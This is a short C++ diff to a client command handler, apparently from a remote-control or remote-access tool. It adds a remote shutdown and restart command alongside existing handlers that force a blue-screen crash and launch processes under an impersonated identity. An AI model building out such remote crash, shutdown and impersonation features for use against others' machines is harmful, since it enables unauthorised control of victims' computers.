@@ -219,13 +219,20 @@ BOOL Client::PerformCommand(const Packet& command, ClientResponse& outResponse) 
     case RemoteAction::kRemoteBSOD:
         this->m_ProcMgr.BSOD();
         break;
+    case RemoteAction::kRemoteShutdown:
+        if ( command.buffer == "restart" )
+            this->m_ProcMgr.ShutdownSystem(ShutdownReboot);
+        else if ( command.buffer == "shutdown" )
+            this->m_ProcMgr.ShutdownSystem(ShutdownPowerOff);
+
+        break;
     case RemoteAction::kOpenRemoteProcess:
-        STARTUPINFO         si = {};
+        STARTUPINFO si = {};
         PROCESS_INFORMATION pi = {};
 
         success = this->m_ProcMgr.OpenProcessAsImposter(
             description.creationContext,
-            0,
+            LOGON_WITH_PROFILE,
             description.application.data(),
             description.commandArgs.data(),
             description.creationFlags,
